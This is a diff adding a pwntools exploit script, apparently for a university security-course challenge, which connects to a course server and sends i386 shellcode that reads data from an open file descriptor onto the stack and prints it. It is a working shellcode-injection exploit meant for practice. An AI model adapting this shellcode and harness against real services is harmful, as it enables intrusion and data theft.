@@ -1,0 +1,74 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './simple' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 17521 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+
+my_assembly = """
+mov eax, 0x3
+mov ebx, 1000
+mov edx, 100
+
+sub esp, 500
+mov ecx, esp
+
+int 0x80
+
+mov eax, 0x4
+mov ebx, 1
+mov edx, 100
+
+int 0x80
+"""
+my_shellcode = asm(my_assembly)
+p.recvuntil(b'enter your shellcode:', drop=True)
+
+p.sendline(my_shellcode)
+
+p.interactive()
+
